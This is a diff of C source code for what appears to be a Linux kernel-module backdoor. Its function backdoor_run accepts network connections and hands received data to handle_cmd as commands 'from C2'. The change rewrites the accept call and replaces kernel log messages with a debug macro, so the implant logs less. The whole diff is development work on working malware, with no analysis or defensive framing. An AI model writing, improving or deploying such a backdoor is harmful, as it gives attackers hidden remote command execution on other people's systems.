@@ -122,6 +122,7 @@ int backdoor_run(void *data)
     return err;
   }
 
+
   // Main server loop
   for (;;) {
     // Check if exit required
@@ -131,20 +132,21 @@ int backdoor_run(void *data)
     memset(buffer, 0, BKDOOR_BUF_SIZE);
 
     // Wait for accept
-    err = kernel_accept(bkdoor->sock, &bkdoor->conn, 0);
+    debug("Waiting for connection\n");
+    err = bkdoor->conn->ops->accept(bkdoor->sock, bkdoor->conn, 0, 0);
     if (err < 0) {
+      debug("Error accepting connection\n");
       // Error accepting connection
       break;
     }
 
-    printk(KERN_INFO "Received a new connection\n");
+    debug("Received a new connection\n");
 
     size = backdoor_recv(bkdoor->conn, buffer, sizeof(buffer));
-    printk(KERN_INFO "Received %ld bytes: %s\n", size, buffer);
+    debug("Received %ld bytes: %s\n", size, buffer);
 
     // If size < 0, connection probably closed
     if (size < 0) { break; }
-    printk(KERN_INFO "Received some bytes from new connection\n");
 
     // Process command from C2
     handle_cmd(buffer, size);
